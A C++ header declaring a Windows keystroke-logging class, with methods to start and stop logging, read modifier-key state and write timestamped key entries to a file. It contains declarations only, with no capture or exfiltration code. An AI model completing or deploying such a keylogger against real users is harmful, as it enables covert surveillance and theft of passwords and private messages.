#ifndef KEYLOG_H
#define KEYLOG_H

#include <string>
#include <mutex>
#include <thread>
#include <atomic>
#include <chrono>
#include <windows.h>
#include <spdlog/spdlog.h>

class KeyLogger {
public:
    explicit KeyLogger(const std::string& filePath); // Constructor with file path
    ~KeyLogger();
    
    // Prevent copying
    KeyLogger(const KeyLogger&) = delete;
    KeyLogger& operator=(const KeyLogger&) = delete;

    void StartLogging();
    void StopLogging();
    std::string GetKeyName(int vkCode, bool shiftPressed, bool capsLock);

private:
    struct KeyboardState {
        bool shiftPressed;
        bool ctrlPressed;
        bool altPressed;
        bool capsLock;
    };

    FILE* logFile = nullptr;
    std::mutex logMutex;
    std::atomic<bool> running;
    std::thread loggingThread;
    std::string filePath;
    static constexpr size_t BUFFER_SIZE = 1024;

    bool openLogFile();
    KeyboardState getKeyboardState() const;
    std::string formatLogEntry(int vkCode, const std::string& keyName, 
                              const KeyboardState& state,
                              const std::chrono::system_clock::time_point& startTime);
    void flushBuffer(char* buffer, size_t& bufferPos);
    void processKeyPress(int vkCode, const KeyboardState& state, char* buffer,
                        size_t& bufferPos, const std::chrono::system_clock::time_point& startTime);
};

#endif /* KEYLOG_H */